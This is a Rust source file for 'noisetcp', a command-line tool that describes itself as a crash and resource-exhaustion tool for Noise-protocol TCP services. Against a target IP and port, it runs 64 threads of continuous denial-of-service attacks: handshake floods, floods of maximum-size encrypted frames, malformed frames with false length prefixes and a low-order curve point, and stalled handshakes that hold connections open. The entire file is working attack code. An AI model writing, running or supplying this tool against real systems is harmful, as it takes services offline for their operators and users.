use clap::Parser;
use snow::{Builder, HandshakeState, TransportState};
use std::fmt;
use std::io::{self, Read, Write};
use std::net::{IpAddr, SocketAddr, TcpStream};
use std::sync::atomic::{AtomicU64, Ordering};
use std::sync::Arc;
use std::thread;
use std::time::{Duration, Instant};

const NOISE_PATTERN: &str = "Noise_XX_25519_ChaChaPoly_BLAKE2s";
const WORKERS: usize = 64;
const MAX_FRAME: usize = 65_535;
const MAX_PLAINTEXT: usize = MAX_FRAME - 16;
const PIPELINE: usize = 64;
const STALL_BATCH: usize = 16;
const CONNECT_TIMEOUT: Duration = Duration::from_millis(750);
const IO_TIMEOUT: Duration = Duration::from_secs(2);
const RETRY_DELAY: Duration = Duration::from_millis(25);
const STALL_HOLD: Duration = Duration::from_secs(15);

#[derive(Parser)]
#[command(
    name = "noisetcp",
    version,
    about = "Aggressive Noise-over-TCP crash and resource-exhaustion tool"
)]
struct Args {
    #[arg(help = "Target node IP address")]
    ip: IpAddr,

    #[arg(default_value_t = 9000, help = "Target TCP port")]
    port: u16,
}

#[derive(Default)]
struct Stats {
    connections: AtomicU64,
    handshakes: AtomicU64,
    frames: AtomicU64,
    bytes: AtomicU64,
    failures: AtomicU64,
}

impl Stats {
    fn connection(&self) {
        self.connections.fetch_add(1, Ordering::Relaxed);
    }

    fn handshake(&self) {
        self.handshakes.fetch_add(1, Ordering::Relaxed);
    }

    fn frame(&self, len: usize) {
        self.frames.fetch_add(1, Ordering::Relaxed);
        self.bytes.fetch_add(len as u64 + 2, Ordering::Relaxed);
    }

    fn failure(&self) {
        self.failures.fetch_add(1, Ordering::Relaxed);
    }
}

fn main() {
    let args = Args::parse();
    let address = SocketAddr::new(args.ip, args.port);
    let params = NOISE_PATTERN.parse().expect("valid Noise pattern");
    let keypair = Builder::new(params)
        .generate_keypair()
        .unwrap_or_else(|error| {
            eprintln!("failed to generate Noise keypair: {error}");
            std::process::exit(1);
        });
    let private_key = Arc::new(keypair.private);
    let stats = Arc::new(Stats::default());

    println!("target={address} workers={WORKERS} attack=continuous");
    println!("Ctrl+C to stop");

    thread::scope(|scope| {
        for worker_id in 0..WORKERS {
            let private_key = Arc::clone(&private_key);
            let stats = Arc::clone(&stats);
            scope.spawn(move || match worker_id % 4 {
                0 => handshake_flood(address, &private_key, &stats),
                1 => transport_flood(address, &private_key, &stats),
                2 => malformed_flood(address, &stats),
                _ => handshake_stall(address, &private_key, &stats),
            });
        }

        let stats = Arc::clone(&stats);
        scope.spawn(move || report(stats));
    });
}

fn report(stats: Arc<Stats>) {
    let started = Instant::now();
    loop {
        thread::sleep(Duration::from_secs(5));
        println!(
            "[{:6}s] connections={} handshakes={} frames={} MB={} failures={}",
            started.elapsed().as_secs(),
            stats.connections.load(Ordering::Relaxed),
            stats.handshakes.load(Ordering::Relaxed),
            stats.frames.load(Ordering::Relaxed),
            stats.bytes.load(Ordering::Relaxed) / 1_000_000,
            stats.failures.load(Ordering::Relaxed)
        );
    }
}

fn handshake_flood(address: SocketAddr, private_key: &[u8], stats: &Stats) {
    loop {
        let result = (|| -> io::Result<()> {
            let mut connection = Connection::connect(address, stats)?;
            complete_handshake(&mut connection, private_key)?;
            stats.handshake();
            Ok(())
        })();
        if result.is_err() {
            stats.failure();
            thread::sleep(RETRY_DELAY);
        }
    }
}

fn transport_flood(address: SocketAddr, private_key: &[u8], stats: &Stats) {
    let plaintext = vec![0x41; MAX_PLAINTEXT];
    loop {
        let result = (|| -> io::Result<()> {
            let mut connection = Connection::connect(address, stats)?;
            let mut transport = complete_handshake(&mut connection, private_key)?;
            stats.handshake();
            let mut frame = vec![0; MAX_FRAME];
            loop {
                let len = transport
                    .write_message(&plaintext, &mut frame)
                    .map_err(noise_error)?;
                connection.send(&frame[..len])?;
                stats.frame(len);
            }
        })();
        if result.is_err() {
            stats.failure();
            thread::sleep(RETRY_DELAY);
        }
    }
}

fn malformed_flood(address: SocketAddr, stats: &Stats) {
    const LOW_ORDER: [u8; 32] = [
        0xe0, 0xeb, 0x7a, 0x7c, 0x3b, 0x41, 0xb8, 0xae, 0x16, 0x56, 0xe3, 0xfa, 0xf1, 0x9f, 0xc4,
        0x6a, 0xda, 0x09, 0x8d, 0xeb, 0x9c, 0x32, 0xb1, 0xfd, 0x86, 0x62, 0x05, 0x16, 0x5f, 0x49,
        0xb8, 0x00,
    ];

    let body = vec![0xff; MAX_FRAME];
    loop {
        let result = (|| -> io::Result<()> {
            let mut connection = Connection::connect(address, stats)?;
            for round in 0..PIPELINE {
                let len = match round % 4 {
                    0 => {
                        connection.send(&body)?;
                        body.len()
                    }
                    1 => {
                        connection.send_declared(1, &body)?;
                        body.len()
                    }
                    2 => {
                        connection.send(&LOW_ORDER)?;
                        LOW_ORDER.len()
                    }
                    _ => {
                        connection.send_declared(u16::MAX, &[0x41; 8])?;
                        connection.send(&[0; 32])?;
                        40
                    }
                };
                stats.frame(len);
            }
            Ok(())
        })();
        if result.is_err() {
            stats.failure();
            thread::sleep(RETRY_DELAY);
        }
    }
}

fn handshake_stall(address: SocketAddr, private_key: &[u8], stats: &Stats) {
    loop {
        let mut held = Vec::with_capacity(STALL_BATCH);
        let mut failed = false;
        for _ in 0..STALL_BATCH {
            let result = (|| -> io::Result<Connection> {
                let mut connection = Connection::connect(address, stats)?;
                xx_response(&mut connection, private_key)?;
                Ok(connection)
            })();
            match result {
                Ok(connection) => held.push(connection),
                Err(_) => {
                    stats.failure();
                    failed = true;
                }
            }
        }
        thread::sleep(STALL_HOLD);
        drop(held);
        if failed {
            thread::sleep(RETRY_DELAY);
        }
    }
}

struct Connection {
    stream: TcpStream,
}

impl Connection {
    fn connect(address: SocketAddr, stats: &Stats) -> io::Result<Self> {
        let stream = TcpStream::connect_timeout(&address, CONNECT_TIMEOUT)?;
        stream.set_nodelay(true)?;
        stream.set_read_timeout(Some(IO_TIMEOUT))?;
        stream.set_write_timeout(Some(IO_TIMEOUT))?;
        stats.connection();
        Ok(Self { stream })
    }

    fn send(&mut self, body: &[u8]) -> io::Result<()> {
        let len = u16::try_from(body.len())
            .map_err(|_| io::Error::new(io::ErrorKind::InvalidInput, "frame exceeds u16 length"))?;
        self.send_declared(len, body)
    }

    fn send_declared(&mut self, declared: u16, body: &[u8]) -> io::Result<()> {
        self.stream.write_all(&declared.to_be_bytes())?;
        self.stream.write_all(body)
    }

    fn receive(&mut self) -> io::Result<Vec<u8>> {
        let mut prefix = [0; 2];
        self.stream.read_exact(&mut prefix)?;
        let mut body = vec![0; u16::from_be_bytes(prefix) as usize];
        self.stream.read_exact(&mut body)?;
        Ok(body)
    }
}

fn initiator(private_key: &[u8]) -> io::Result<HandshakeState> {
    let params = NOISE_PATTERN.parse().map_err(noise_error)?;
    Builder::new(params)
        .local_private_key(private_key)
        .build_initiator()
        .map_err(noise_error)
}

fn xx_response(connection: &mut Connection, private_key: &[u8]) -> io::Result<HandshakeState> {
    let mut state = initiator(private_key)?;
    let mut first = vec![0; 128];
    let first_len = state.write_message(&[], &mut first).map_err(noise_error)?;
    connection.send(&first[..first_len])?;
    let response = connection.receive()?;
    let mut payload = vec![0; MAX_FRAME];
    state
        .read_message(&response, &mut payload)
        .map_err(noise_error)?;
    Ok(state)
}

fn complete_handshake(
    connection: &mut Connection,
    private_key: &[u8],
) -> io::Result<TransportState> {
    let mut state = xx_response(connection, private_key)?;
    let mut third = vec![0; 128];
    let third_len = state.write_message(&[], &mut third).map_err(noise_error)?;
    connection.send(&third[..third_len])?;
    state.into_transport_mode().map_err(noise_error)
}

fn noise_error(error: impl fmt::Display) -> io::Error {
    io::Error::new(io::ErrorKind::InvalidData, error.to_string())
}
